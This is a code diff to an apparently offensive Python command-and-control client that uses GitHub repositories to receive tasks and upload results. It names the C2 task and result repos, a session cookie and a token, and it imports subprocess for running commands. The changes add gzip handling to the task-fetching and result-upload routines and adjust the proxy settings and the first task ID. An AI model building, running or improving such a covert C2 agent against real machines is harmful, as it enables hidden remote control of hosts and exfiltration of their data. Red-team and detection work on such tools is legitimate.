@@ -1,3 +1,4 @@
+import gzip
 import http.client
 import subprocess
 from time import sleep
@@ -14,18 +15,17 @@ C2_GITHUB_REPO = "https://github.com/gokupwn/c2_github_repo"
 C2_RESULT_REPO = "https://github.com/gokupwn/c2_result_repo"
 C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
 C2_CLIENT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
-PROXY_HOST = '127.0.0.1'
+PROXY_HOST = ''
 PROXY_PORT = 8080
 AUTHENTICITY_TOKEN = 'YOUR_AUTHENTICITY_TOKEN'
-FIRST_TASK_ID = 15111785 ### TAKE IT FROM THE server.ini File and the value of first_command
+FIRST_TASK_ID = 15119236 ### TAKE IT FROM THE server.ini File and the value of first_command
 
 def fetchRepoHtml(host, path):
-
-    if PROXY_HOST != '':
+    if PROXY_HOST == '':
+        connection = http.client.HTTPSConnection(host)
+    else:
         connection = http.client.HTTPSConnection(PROXY_HOST, PROXY_PORT)
         connection.set_tunnel(host)
-    else:
-        connection = http.client.HTTPSConnection(host)
 
     headers = {
         'Accept': 'text/html, application/xhtml+xml',
@@ -43,7 +43,12 @@ def fetchRepoHtml(host, path):
     
     connection.request("GET", path, headers=headers)
     response = connection.getresponse()
-    html_response = response.read().decode()
+    if response.getheader('Content-Encoding') == 'gzip':
+        # If the response is gzip-encoded, decode it
+        html_response = gzip.decompress(response.read())
+        html_response = html_response.decode()
+    else:
+        html_response = response.read().decode()
     connection.close()
     return html_response
 
@@ -251,6 +256,13 @@ def getUploadLink(request_1_response):
     # Send the request
     connection.request("PUT", f"/upload/repository-files/{request_1_response['asset']['id']}", body=body_bytes, headers=headers)
     response = connection.getresponse()
+
+    if response.getheader('Content-Encoding') == 'gzip':
+        # If the response is gzip-encoded, decode it
+        status = response.status
+        response = gzip.decompress(response.read())
+
+        return status, json.loads(response.decode())
     
     return response.status, json.loads(response.read().decode())
 
